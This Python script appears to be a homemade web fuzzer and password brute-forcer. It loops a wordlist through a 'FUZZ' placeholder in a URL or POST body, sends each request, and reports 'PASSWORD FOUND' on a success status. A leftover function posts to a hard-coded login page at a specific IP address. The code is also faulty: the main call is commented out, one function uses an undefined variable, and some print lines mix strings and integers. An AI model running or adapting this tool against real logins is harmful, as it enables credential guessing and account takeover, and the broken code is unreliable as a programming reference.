import requests
import sys
import time
import getopt
import re

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities


def main():
    argv = sys.argv[1:]
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "w:f:p:c:")
    except getopt.GetoptError:
        print("Error in arguments")
        sys.exit()

    payload = ""
    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-f':
            dict = arg
        elif opt == '-p':
            payload = arg
        elif opt == '-c':
            hidecode = arg

    try:
        f = open(dict, "r")
        words = f.readlines()
    except:
        print("Failed opening file: " + dict + "\n")
        sys.exit()

    launch_attack(words, url, payload)


def launch_attack(names, url, payload):
    print("Time" + "\t" + "\t code \t\tchars\t\twords\t\tlines")
    for name in names:
        word = name.split("\n")[0]
        pl = ""
        if payload != "":
            pl = payload.replace('FUZZ', word)
        else:
            pl = payload
        attack(word, url.replace('FUZZ', word), pl)

def attack(word, url, payload):
    start = time.time()
    if payload == "":
        r = requests.get(url)
        elaptime = time.time()
        totaltime = str(elaptime - start)[1:10]
    else:
        list = payload.replace("=", " ").replace("&", " ").split(" ")
        payload = dict([(k, v) for k,v in zip(list[::2], list[1::2])])
        r = requests.post(url, data=payload)
        elaptime = time.time()
        totaltime = str(elaptime - start)[1:10]

    # lines = str(r.content.count("\n"))
    chars = str(len(r._content))
    words = str(len(re.findall("\S+", r.content.decode())))
    code = int(str(r.status_code))

    # if r.history != []:
    #     first = r.history[0]
    #     code = str(first.status_code)
    # else:
    #     pass

    print(code)
    if 200 <= code < 300:
        print(totaltime + "\t"  + str(code), "   \t\t" + word + " \t\t" + words + " \t\t " +"\t" + r.headers["server"] + "\t" + word)
        print("PASSWORD FOUND: " + word)
        sys.exit(1)
    elif 400 <= code < 500:
        print(totaltime + "\t" + code, "   \t\t" + word + " \t\t" + words + " \t\t "  + "\t" + r.headers["server"] + "\t" +  word)
    elif 300 <= code < 400:
        print(totaltime + "\t" + code, "   \t\t" + word + " \t\t" + words + " \t\t " + "\t"+ r.headers["server"] + "\t" + word)
    else:
        pass

#  main()

def trial():
    r = requests.post("http://46.101.91.7/login", data=payload)
